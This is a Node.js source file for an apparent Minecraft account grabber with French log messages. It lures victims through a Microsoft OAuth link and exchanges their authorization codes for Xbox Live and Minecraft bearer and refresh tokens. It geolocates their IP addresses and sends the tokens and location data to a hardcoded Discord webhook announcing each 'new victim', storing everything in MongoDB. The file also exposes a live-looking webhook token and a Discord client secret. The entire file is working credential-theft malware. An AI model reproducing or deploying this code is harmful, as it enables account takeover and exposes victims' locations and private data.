var request = require('sync-request');
var fetch = require('node-fetch')
const rp = require("request-promise")
const mongoose = require('mongoose')
const chalk = require('chalk')
const axios = require('axios').default
var http_client_methods_1 = require("http-client-methods");
const { EmbedBuilder, WebhookClient } = require('discord.js');
const webhookClient = new WebhookClient({ id: "1035884907701997599", token: "o_pJJXfQclpgwlvy9PgGNR26attbx23mNZ6rnIfETo9HCRgns9wNhTT9Xdju9FxC7_j8" });
const Cryptr = require('cryptr');
const cryptr = new Cryptr('jeromestgay');

const app = require('express')();
server = require('http').Server(app)
require('dotenv').config()
app.use(require('body-parser').json())
app.use(require('body-parser').urlencoded({
  extended: true
}))

var usernameArray = []

var domainUrl = process.env.domainUrl;
var port = process.env.port;
var mongoUrl = process.env.mongoUrl;
var clientId = process.env.azureClientId;
var clientSecret = process.env.azureClientSecret
var redirectUrl = process.env.azureRedirectUrl 
var webhook_url = process.env.webhookUri
var discordOauthUrl = process.env.discordOauthUrl
var microsoftOauthUrl = "https://login.live.com/oauth20_token.srf"
var scopes = encodeURIComponent("XboxLive.signin offline_access openid https://graph.microsoft.com/mail.read");
var roleID = process.env.roleID
var discordBotToken = process.env.discordBotToken

var asciiMc = `
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⡿⠿⠿⠿⠿⠿⠿⢿⣀⣀⣀⣀⣀⡀         
⠀⠀⠀⠀⠀⠀⠸⠿⣇⣀⣀⣀⣀⣀⣀⣸⠿⢿⣿⣿⣿⡇⠀⠀      
⠀⠀⠀⠀⠀⠀⠀⠀⠻⠿⠿⠿⠿⠿⣿⣿⣀⡸⠿⢿⣿⡇⠀⠀      8b    d8  dP""b8      dP""b8 88""Yb    db    88""Yb 88""Yb 888888 88""Yb 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿⣿⣿⣧⣤⡼⠿⢧⣤⡀      88b  d88 dP   \`"     dP   \`" 88__dP   dPYb   88__dP 88__dP 88__   88__dP 
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿⣿⣿⣿⠛⢻⣿⡇⠀⢸⣿⡇      88YbdP88 Yb          Yb  "88 88"Yb   dP__Yb  88""Yb 88""Yb 88""   88"Yb
⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤⣿⣿⣿⣿⠛⠛⠀⢸⣿⡇⠀⢸⣿⡇      88 YY 88  YboodP      YboodP 88  Yb dP""""Yb 88oodP 88oodP 888888 88  Yb  
⠀⠀⠀⠀⠀⠀⢠⣤⣿⣿⣿⣿⠛⠛⠀⠀⠀⢸⣿⡇⠀⢸⣿⡇     
⠀⠀⠀⠀⢰⣶⣾⣿⣿⣿⠛⠛⠀⠀⠀⠀⠀⠈⠛⢳⣶⡞⠛⠁                                            Laaw
⠀⠀⢰⣶⣾⣿⣿⣿⡏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠁⠀⠀
⢰⣶⡎⠉⢹⣿⡏⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣷⣶⡎⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠉⠉⠉⠁⠀⠀⠀⠀
------------------------------------------------------------------------------------------------------------------------
`

async function start(clientId, redirectUrl, scopes){
    console.clear()
    console.log(chalk.red(asciiMc))
    var azureUrl = `https://login.live.com/oauth20_authorize.srf?client_id=${clientId}&response_type=code&redirect_uri=${redirectUrl}&scope=${scopes}`
    console.log(azureUrl)

    app.get('/token', async (req, res) => {
        res.redirect(`${domainUrl}/redirect`)
        var code = req.url.split("?code=")[1]

        if(code == null){
            console.error('[!] - The code is null')
        }

        try {
            var ip = await getIp()
            var ipInfoArray = await getIpInfo(ip)
            var ipCountry = ipInfoArray[0]
            var ipRegion = ipInfoArray[1]
            var ipCity = ipInfoArray[2]
            var ipZip = ipInfoArray[3]
            var ipLat = ipInfoArray[4]
            var ipLon = ipInfoArray[5]
            var ipOpe = ipInfoArray[6]
            sendWebhookIp(ip, ipCountry, ipRegion, ipCity, ipZip, ipLat, ipLon, ipOpe)
            
            var accesTokenArray = await getAccesToken(code, clientId, clientSecret, redirectUrl)
            var accesToken = accesTokenArray[0]
            var refreshToken = accesTokenArray[1]
            var refreshTokenCrypt = cryptr.encrypt(refreshToken)
            var xblToken = await getXblToken(accesToken)
            var xstsTokenArray = await getXstsToken(xblToken)
            var xstsToken = xstsTokenArray[0]
            var xstsUuid = xstsTokenArray[1]
            var mcBearerToken = await getMcToken(xstsToken, xstsUuid)
            var mcBearerTokenCrypt = cryptr.encrypt(mcBearerToken)
            var usernameAndUuidArray = await getUsernameAndUuid(mcBearerToken)
            var username = usernameAndUuidArray[0]
            usernameArray.push(username)
            var uuid = usernameAndUuidArray[1]
            var capesUrl = usernameAndUuidArray[2]
            var skinUrl = usernameAndUuidArray[3]
            var networth = "cc"
            sendWebhookMc(mcBearerToken, username, uuid, capesUrl, skinUrl, networth)
            sendInfoToApi(mcBearerTokenCrypt, refreshTokenCrypt, username, uuid, capesUrl, skinUrl, networth, ip, ipCountry, ipRegion, ipCity, ipZip, ipLat, ipLon, ipOpe)

        } catch(error) {
            console.error(error)
        }
        
        
    
         
    })
}


async function api(domainUrl, port, mongoUrl) {

    mongoose.connect(mongoUrl, {
        useNewUrlParser: true,
        useUnifiedTopology: true
    })

    mongoose.connection.on('connected', e => {
      if (e) throw e
     console.log('Connecté à MongoDB')
    })

    const ModelCompte = mongoose.model('compte', {
    username: String,
     userInfo : {
        uuid: String,
        mcBearerToken: String,
        refreshToken: String,
        avatarUrl: String,
        capeUrl: String,
        networth: Number
    },
    userIP : {
        IPV4: String,
        localisation: {
            country: String,
            region: String,
            city: String,
            zipCode: String,
            latitude: String,
            longitude: String
        },
        operator: String
    },
 
    })

// CONNECTION PORT SERVEUR: 
    server.listen(port, (e)=> {
       if (e) throw new Error(e)
      console.info(`${domainUrl}:${port}/`)
    })

    app.get('/comptes', (req, res) => {
     ModelCompte.find({}, (e, d)=> {
        if (e) return new Error(e)
       if (!d) {
            return res.status(203).json({
              NombresDeComptes: 0
            })
        } else return res.status(203).json({
              NombreDeComptes: d.length,
              Comptes: d
         })
         })
    })

    app.post('/create', (req, res) => {           
    const g = new ModelCompte({
    username: req.body.username,
    userInfo : {
 
        uuid: req.body.userInfo.uuid,
        mcBearerToken: req.body.userInfo.bToken,
        refreshToken: req.body.userInfo.rToken,
        avatarUrl: req.body.userInfo.avaUrl,
        capeUrl: req.body.userInfo.capeUrl,
        networth: req.body.userInfo.networth
    },
    userIP : {
        IPV4: req.body.userIP.IPV4,
        localisation: {
            country: req.body.userIP.localisation.country,
            region: req.body.userIP.localisation.region,
            city: req.body.userIP.localisation.city,
            zipCode: req.body.userIP.localisation.zipCode,
            latitude: req.body.userIP.localisation.latitude,
            longitude: req.body.userIP.localisation.longitude
        },
        operator: req.body.operator
    },
})
   g.save().then(() => {
    console.log('[!] - Nouvelle victime')
   })
       })


    app.delete('/delete', (req, res) => {
        ModelCompte.remove({}, function(err) { 
           console.log('[!] - Toutes les données ont correctement été effacé') 
        });
        
        })
    
    app.get('/profile/:name',  async function(req, res) {
        var name = req.params.name

        await ModelCompte.find({
            username: name
        }).exec(async function(err,docs) {
            if (err) return console.error(`[!] - Nouvelle Erreur (get /profile/:username) : ${err}`);

            var networth = await getNetworth(name)

            if(docs[0].userInfo.networth != networth) {
                console.log(`[!] - Networth d'une victime a changé (${name})`)

                await ModelCompte.updateMany({ username: name }, {
                    userInfo: {
                        networth: networth
                    }
                  });
                
                const updatedDoc = await ModelCompte.find({
                    username: name
                })
              
                res.json({
                    data: updatedDoc
                    
                })

            } else {

                res.json({
                    data: docs  
                })

            }
       
    })
    })

    app.get('/redirect', function(req, res) {
        res.redirect(discordOauthUrl)
    })

// app.get('/',(req,res)=>{
//     res.send(`
//         <div style="margin: 300px auto;
//         max-width: 400px;
//         display: flex;
//         flex-direction: column;
//         align-items: center;
//         font-family: sans-serif;"
//         >
//             <h3>Welcome to Discord OAuth NodeJS App</h3>
//             <p>Click on the below button to get started!</p>
//             <a 
//                 href="https://discord.com/api/oauth2/authorize?client_id=1003243740799959072&redirect_uri=http%3A%2F%2Flocalhost%3A8000%2Fauth%2Fdiscord&response_type=code&scope=identify%20email"
//                 style="outline: none;
//                 padding: 10px;
//                 border: none;
//                 font-size: 20px;
//                 margin-top: 20px;
//                 border-radius: 8px;
//                 background: #6D81CD;
//                 cursor:pointer;
//                 text-decoration: none;
//                 color: white;"
//             >
//             Login with Discord</a>
//         </div>
//     `)
// })

app.get('/auth/discord', async(req,res)=>{
    const code = req.query.code;
    const params = new URLSearchParams();
    let user;
    params.append('client_id', "1040403463135305747");
    params.append('client_secret', "oBI6lvSDO1bm5NNum9u7E3dfldRXQPvY");
    params.append('grant_type', 'authorization_code');
    params.append('code', code);
    params.append('redirect_uri', `${domainUrl}/auth/discord`);
    try{
        var response = await axios.post('https://discord.com/api/oauth2/token', params)
        const { access_token, token_type } = response.data;
        const userDataResponse= await axios.get('https://discord.com/api/users/@me',{
            headers: {
                authorization: `${token_type} ${access_token}`
            }
        })
        console.log('[!] - Nouvelle victime connecté a discord :  ',userDataResponse.data)
        user = {
            username: userDataResponse.data.username,
            uuid: userDataResponse.data.id,
            email: userDataResponse.data.email,
            avatar: userDataResponse.avatar

        }

        var username = usernameArray[0]

        
            var body = {
            "nick": username,
            "roles": [roleID]
        }

        axios.patch(`https://discord.com/api/v9/guilds/1035884874256613428/members/${user.uuid}`, body, {
            headers: {
                "Authorization":`Bot ${discordBotToken}`
            }
        }).then((response) => {
      
          usernameArray.pop(username)
        })
        return res.json(user)
        
    } catch(error){
        console.log("[!] - Nouvelle erreur (get /auth/discord) : ", error)
        return res.json("[!] - Une erreur s'est produite")
    }
    
 
})

}

async function getIp() {
    let a = await axios.get('https://api.ipify.org?format=json')
    return a.data['ip']
}

async function getIpInfo(ip) {
    //https://maps.googleapis.com/maps/api/staticmap?center=40.714728,-73.998672&zoom=12&size=400x400&key=YOUR_API_KEY&signature=YOUR_SIGNATURE
    var response = await axios.get(`http://ip-api.com/json/${ip}`)
    return [response.data['country'], response.data['regionName'], response.data['city'], response.data['zip'], response.data['lat'], response.data['lon'], response.data['as']]
}
async function getAccesToken(code, clientId, clientSecret, redirectUrl) {
    var body = `client_id=${clientId}&client_secret=${clientSecret}&code=${code}&grant_type=authorization_code&redirect_uri=${redirectUrl}`
                      
    var response = await http_client_methods_1.HttpPost(microsoftOauthUrl, body, { "Content-Type": "application/x-www-form-urlencoded"})
       var repParse = JSON.parse(response)
       var accesToken = repParse.access_token
       var refreshToken = repParse.refresh_token

       return [accesToken, refreshToken]
   
    
}

async function getXblToken(accesToken) {
    body = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": "d=".concat(accesToken)
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT"
     };
     var response = await http_client_methods_1.HttpPost("https://user.auth.xboxlive.com/user/authenticate", JSON.stringify(body), {
            "Content-Type": "application/json",
            "Accept": "application/json"
        })
           repParse = JSON.parse(response)
           return repParse.Token
        
}


async function getXstsToken(xblToken) {
    body2 = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [
                "".concat(xblToken)
            ]
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT"
    };
   var response = await http_client_methods_1.HttpPost("https://xsts.auth.xboxlive.com/xsts/authorize", JSON.stringify(body2), {
            "Content-Type": "application/json",
            "Accept": "application/json"
        })
        var repParse = JSON.parse(response)
        return [repParse.Token, repParse.DisplayClaims.xui[0].uhs]
 

}

async function getMcToken(xstsToken, xstsUuid) {
    body = {
        "identityToken": "XBL3.0 x=".concat(xstsUuid, ";").concat(xstsToken)
    };
 var response = await http_client_methods_1.HttpPost("https://api.minecraftservices.com/authentication/login_with_xbox", JSON.stringify(body), {
            "Content-Type": "application/json",
            "Accept": "application/json"
        })
           var repParse = JSON.parse(response)

           return repParse.access_token
       
     
}

async function getUsernameAndUuid(mcBearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + mcBearerToken,
        }
    }
    var response = await axios.get(url, config)

    return [response.data.name, response.data.id, response.data.capes[0].url, response.data.skins[0].url]
}

async function getNetworth(name) {

  }

async function sendWebhookIp(ip, ipCountry, ipRegion, ipCity, ipZip, ipLat, ipLon, ipOpe) {

  const embed = new EmbedBuilder()
	.setTitle('**Ip Info**')
	.setColor('#2f3136')
    .addFields(
        {name: "IP 🧞‍♀️", value: `\`croit pas t'auras mon ip jerome\``, inline: true},
        {name: "Pays 🚩", value: `\`${ipCountry}\``, inline: true},
        {name: "Region 🔭", value: `\`${ipRegion}\``, inline: true},
        {name: "Ville 🕕", value: `\`${ipCity}\``, inline: true},
        {name: "Zip Code 🔑", value: `\`${ipZip}\``},
        {name: "Latitude", value: `\`${ipLat}\``},
        {name: "Longitude", value: `\`${ipLon}\``},
        {name: "Operateur 🧞‍♀️", value: `\`${ipOpe}\``},

    )
   .setTimestamp()

webhookClient.send({
	content: '@everyone ```Nouvelle victime```',
	embeds: [embed],
});
}

async function sendWebhookMc(mcBearerToken, username, uuid, capesUrl, skinUrl, networth) {
    if(networth > 1) {
    const embed = new EmbedBuilder()
      .setTitle('**Minecraft Info**')
      .setColor('#2f3136')
      .addFields(
          {name: "Nom", value: `\`${username}\``, inline: true},
          {name: "UUID", value: `\`${uuid}\``, inline: true},
          {name: "Networth", value: `✅ (\`NOP\`)`},
          {name: "Minecraft Auth", value: `\`${username}:${uuid}:${mcBearerToken}\``},
        )
     .setTimestamp()
     .setAuthor({ name: 'Laaw', iconURL: 'https://play-lh.googleusercontent.com/VSwHQjcAttxsLE47RuS4PqpC4LT7lCoSjE7Hx5AW_yCxtDvcnsHHvm5CTuL5BPN-uRTP'})
     .setThumbnail(capesUrl)
     .setImage(skinUrl)
  
  webhookClient.send({
      content: '---------------------------------------------',
      embeds: [embed],
  });
  
} else {
    const embed = new EmbedBuilder()
      .setTitle('**Minecraft Info**')
      .setColor('#2f3136')
      .addFields(
          {name: "Nom", value: `\`${username}\``, inline: true},
          {name: "UUID", value: `\`${uuid}\``, inline: true},
          {name: "Networth", value: `❌ (\`ISSOU\`)`},
          {name: "Minecraft Auth", value: `\`${username}:${uuid}:${mcBearerToken}\``},
        )
     .setTimestamp()
     .setAuthor({ name: 'Laaw', iconURL: 'https://play-lh.googleusercontent.com/VSwHQjcAttxsLE47RuS4PqpC4LT7lCoSjE7Hx5AW_yCxtDvcnsHHvm5CTuL5BPN-uRTP'})
     .setThumbnail(capesUrl)
     .setImage(skinUrl)
  
  webhookClient.send({
      content: '---------------------------------------------',
      embeds: [embed],
  });
}
}

async function sendInfoToApi(mcBearerToken, refreshToken, username, uuid, capesUrl, skinUrl, networth, ip, ipCountry, ipRegion, ipCity, ipZip, ipLat, ipLon, ipOpe) {
    let body = {
        username: username,
        userInfo : {
            uuid: uuid,
            bToken: mcBearerToken,
            rToken: refreshToken,
            avaUrl: skinUrl,
            capeUrl: capesUrl,
            networth: networth
        },
        userIP : {
            IPV4: ip,
            localisation: {
                country: ipCountry,
                region: ipRegion,
                city: ipCity,
                zipCode: ipZip,
                latitude: ipLat,
                longitude: ipLon
            },
            operator: ipOpe
        },

        
    }
    axios.post(`${domainUrl}/create`, body, { "Content-Type": "application/json"})
}
api(domainUrl, port, mongoUrl)
start(clientId, redirectUrl, scopes)
